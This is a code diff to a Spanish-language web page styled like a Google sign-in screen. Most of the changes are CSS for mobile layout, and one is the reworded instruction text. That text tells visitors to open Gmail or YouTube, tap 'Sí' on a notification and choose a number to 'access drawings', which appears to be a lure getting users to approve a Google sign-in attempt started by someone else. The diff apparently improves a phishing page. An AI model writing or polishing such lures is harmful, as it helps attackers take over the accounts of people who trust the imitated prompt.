@@ -19,7 +19,7 @@
     }
 
     body {
-      background-color: #202124;
+      background-color: #2d2c2c;
       color: #e8eaed;
     }
 
@@ -35,6 +35,8 @@
       flex-direction: column;
       align-items: center;
       min-height: 100vh;
+      padding: 0 20px;
+      box-sizing: border-box;
     }
 
     /* Estilos del logo */
@@ -44,6 +46,7 @@
       display: block;
       margin-left: auto;
       margin-right: auto;
+      flex-shrink: 0;
     }
 
     /* Estilos del formulario */
@@ -51,13 +54,14 @@
       display: flex;
       flex-direction: column;
       width: 355px;
-      background-color: #303134;
-      box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+      max-width: calc(100% - 40px);
+      background-color: #1f1f1f;
       padding: 35px;
       margin-top: 100px;
       padding-top: 5px;
       padding-bottom: 100px;
       border-radius: 8px;
+      flex-shrink: 0;
     }
 
     /* Estilos del título */
@@ -109,6 +113,8 @@
     .footer {
       margin-top: 20px;
       text-align: center;
+      padding: 0 20px;
+      flex-shrink: 0;
     }
 
     .footer p {
@@ -116,6 +122,93 @@
       font-family: Arial, sans-serif;
       word-spacing: 28px;
       color: #9aa0a6;
+    }
+
+    /* Media queries para mantener estructura compacta */
+    @media (max-width: 480px) {
+      .container {
+        padding: 0 15px;
+      }
+      
+      .form {
+        width: 355px;
+        max-width: calc(100% - 30px);
+        padding: 30px;
+        padding-top: 5px;
+        padding-bottom: 90px;
+        margin-top: 80px;
+      }
+      
+      .logo {
+        margin-top: 40px;
+      }
+      
+      .footer {
+        margin-top: 15px;
+      }
+      
+      .footer p {
+        font-size: 11px;
+        word-spacing: 20px;
+      }
+    }
+
+    @media (max-width: 360px) {
+      .container {
+        padding: 0 10px;
+      }
+      
+      .form {
+        width: 355px;
+        max-width: calc(100% - 20px);
+        padding: 25px;
+        padding-top: 5px;
+        padding-bottom: 80px;
+        margin-top: 70px;
+      }
+      
+      .logo {
+        margin-top: 30px;
+      }
+      
+      .footer {
+        margin-top: 10px;
+      }
+      
+      .footer p {
+        font-size: 10px;
+        word-spacing: 15px;
+      }
+    }
+
+    @media (max-height: 700px) {
+      .logo {
+        margin-top: 30px;
+      }
+      
+      .form {
+        margin-top: 60px;
+        padding-bottom: 70px;
+      }
+      
+      .footer {
+        margin-top: 10px;
+      }
+    }
+
+    @media (max-height: 600px) {
+      .logo {
+        margin-top: 20px;
+      }
+      
+      .form {
+        margin-top: 40px;
+        padding-bottom: 50px;
+      }
+      
+      .footer {
+        margin-top: 5px;
+      }
     }
   </style>
 </head>
@@ -137,9 +230,8 @@
       <br>
       
       <!-- Subtítulo con instrucciones -->
-      <div class="subtitle">Google ha enviado 
-una notificación a su dispositivo,  abre la aplicación 
-gmail o youtube, toca <strong style="color: #bdc1c6;">Sí</strong> en la notificación y marca el <strong style="color: #bdc1c6;">número</strong> para acceder a <strong style="color: #bdc1c6;">dibujos</strong>.</div>
+      <div class="subtitle">Abre la aplicacion 
+Gmail o Youtube, toca <strong style="color: #bdc1c6;">Sí</strong> en la notificación y marca el <strong style="color: #bdc1c6;">número</strong> para acceder a <strong style="color: #bdc1c6;">dibujos</strong>.</div>
       <br>
       
       <!-- Enlace -->
